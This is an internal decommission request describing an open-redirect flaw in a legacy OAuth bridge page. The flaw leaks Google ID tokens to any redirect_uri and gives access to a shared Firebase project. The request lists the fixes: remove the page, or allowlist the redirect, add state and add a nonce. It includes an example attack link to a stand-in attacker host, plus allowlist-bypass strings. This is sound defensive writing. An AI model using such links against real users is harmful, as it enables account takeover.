# `/mobile-google-auth` — decommission request (SPENDLY-7 / AUTH-06)

**Host:** `kesavaexpensetracker.netlify.app`, served from the **legacy Vite repo**,
not this one.

**Status in this repo:** every consumer is gone as of SPENDLY-7.
`lib/googleAuthBridge.ts`, `app/google-auth.tsx`, `docs/GOOGLE_AUTH_BRIDGE.md`
and the `google-auth` route registration have been deleted. Nothing in the Expo
app calls this page any more.

**This document exists because deleting our client does not fix the page.** The
vulnerability is on the web origin, in a repo this one cannot reach.

---

## The vulnerability

The page takes a `redirect_uri` query parameter and redirects to it with a
**Google OAuth ID token in the URL fragment** (`#id_token=…`). The parameter is
not validated against an allowlist. So a link of this shape:

```
https://kesavaexpensetracker.netlify.app/mobile-google-auth?redirect_uri=https://attacker.example/
```

completes Google OAuth on a legitimate HTTPS origin the user recognises, then
hands the resulting token to whoever chose the `redirect_uri`.

That token is a Google ID token **for this Firebase project**, valid for roughly
an hour, and it is exactly the input
`signInWithCredential(GoogleAuthProvider.credential(idToken))` accepts. Whoever
holds it becomes that user against the single Firebase project shared by
Spendly, Ganesh Seva and Nutrition — full read and write over their financial
records, and over any Pandal they administer.

Two details that make it worse than it first reads:

- **No unusual user interaction.** Clicking a link and approving a Google
  consent screen, on a domain that looks right, is the whole attack.
- **It is invisible server-side.** A URL fragment is never sent to the server,
  so nothing in the Netlify access logs shows the leak.

## What to do — pick one, in preference order

### 1. Take the page down *(recommended)*

Delete the page component and its route, and add a `410 Gone` — or a redirect to
`/` — in the site's `_redirects`.

This is the right answer because the page exists solely for **Expo Go** Google
sign-in, which the production apps replaced long ago with
`@react-native-google-signin/google-signin` on native and `signInWithPopup` on
web. It has no remaining consumer anywhere.

### 2. If it must stay, all three of the following

Not any one of them — each closes a different hole.

- **Allowlist `redirect_uri`.** Exact-match against a hard-coded array of
  permitted values (the app's `Linking.createURL(…)` scheme URL, and nothing
  else). Reject anything else with a 400 and no redirect.
  **Do not use prefix matching, `startsWith`, or a regex.** `myapp://`
  prefix-matches `myapp://evil@attacker.example`, and an `endsWith` on a host
  matches `evil-mydomain.com`.
- **Add `state`.** Generate a cryptographically random value, store it in
  `sessionStorage` before the OAuth hop, and refuse the callback unless it
  matches. This is what stops a third party initiating the flow at all.
- **Add a `nonce`.** Pass it into the Google auth request and verify it appears
  in the returned ID token, so a token minted for a different session cannot be
  replayed through this page.

## Rotation and audit

**There is nothing to rotate.** ID tokens expire in about an hour and cannot be
revoked individually, so there is no key or secret to cycle.

If you want assurance this was never exploited, check the Firebase Auth
sign-in logs for this project for `signInWithCredential` events from unexpected
IPs or at implausible times. Refresh tokens *can* be revoked per user —
`getAuth().revokeRefreshTokens(uid)` — if you find anything.

## What this repo has already done

- Deleted `lib/googleAuthBridge.ts`, `app/google-auth.tsx`,
  `docs/GOOGLE_AUTH_BRIDGE.md` and the `google-auth` route.
- Kept the `/google-auth` exclusion in
  `shared/config/routeRestoration.ts` on purpose: a device upgrading from an
  older build may still have that route saved, and restoring to a route that no
  longer exists would land the user nowhere.

**`EXPO_PUBLIC_APP_URL` still addresses this origin** for the `/api/*`
market-data functions. Those are unaffected and must keep working — do not take
the whole site down.
